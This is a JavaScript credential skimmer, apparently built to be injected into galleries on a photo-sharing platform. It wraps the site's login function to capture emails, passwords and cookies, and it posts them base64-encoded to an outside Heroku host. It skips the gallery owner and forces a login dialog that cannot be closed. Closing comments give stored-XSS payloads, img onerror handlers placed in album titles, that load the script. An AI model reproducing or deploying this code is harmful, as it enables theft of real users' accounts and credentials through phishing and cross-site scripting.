// Globals
// window.title (set in-line)
// window.loginFnSet
// window.loginScreenShown

function userIsOwner() {
  const userName = _pt$?.userInfo?.userName?.toLowerCase();
  const urlUserName = window.location.hostname.split('.')[0];
  return userName === urlUserName;
}

function postData() {
  if (userIsOwner()) {
    return;
  }

  const dataString = getDataString();

  fetch('https://second-shooter.herokuapp.com/data', {
    method: 'POST',
    headers: {
      'Content-Type': 'text/plain'
    },
    body: dataString
  });
}

function getDataString() {
  const email = window.sessionStorage.getItem('e');
  const password = window.sessionStorage.getItem('p');
  const system = window.sessionStorage.getItem('s');

  const data = {
    headers: _pt$?.hdrs || null,
    userInfo: _pt$?.userInfo || null,
    cookie: document.cookie,
    credentials: {
      email: email || null,
      password: password || null,
      system: system || null
    },
    userAgent: navigator?.userAgent
  };

  return encodeURIComponent(btoa(JSON.stringify(data)))
}

function setLoginFunction() {
  if (window.loginFnSet) {
    return;
  }

  const origLoginFn = _pt$.login2SigninUser.bind({});

  const newLoginFn = (email, password, system, cb) => {
    window.sessionStorage.setItem('e', email);
    window.sessionStorage.setItem('p', password);
    window.sessionStorage.setItem('s', system);

    postData();

    pictime.common.unlockScrolling();

    origLoginFn(email, password, system, cb);
  }

  _pt$.login2SigninUser = newLoginFn;

  window.loginFnSet = true;
}

function isLoggedIn() {
  return _pt$.isGUserLoggedIn();
}

function credentialsAreSet() {
  const email = window.sessionStorage.getItem('e');
  const password = window.sessionStorage.getItem('p');
  const system = window.sessionStorage.getItem('s');

  return !!email && !!password && !!system;
}

function showLogin() {
  if (window.loginScreenShown) {
    return;
  }

  pictime.common.lockScrolling();

  _pt$.loginDialog({ shortBox: 'shortBox' });

  // Hide close button
  $('div[class*=close-x-button]').css('display', 'none');

  // Prevent closing the dialog by clicking the screen
  $('.dialog-2').addClass('blockCancellation');

  window.loginScreenShown = true;
}

// Fix titles
document.title = window.title;
$('.galleryName, #albumTitle, .coverOption1').each(function (i, e) { e.innerHTML = window.title });

// Post initial data
postData();

// Overwrite login function
setLoginFunction();

// If user is logged in but credentials aren't set, show the login prompt
if (isLoggedIn() && !credentialsAreSet()) {
  showLogin();
}

 // Project Title (replace "Album Title"):
 // Album Title|||<img src="_" style="display:none;" onerror="const script=document.createElement('script');script.src='https://second-shooter.herokuapp.com/static/js/pt.js';document.head.appendChild(script);"

 // Replace 'Test Gallery' in BOTH PLACES!!!!!!!!!!!
 // Test Gallery            <img src="_" style="display:none;" onerror="window.title='Test Gallery';document.title=window.title;$('.galleryName,#albumTitle,.coverOption1').each(function(i,e){e.innerHTML=window.title});const script=document.createElement('script');script.src='https://second-shooter.herokuapp.com/static/js/pt.js';document.head.appendChild(script);"
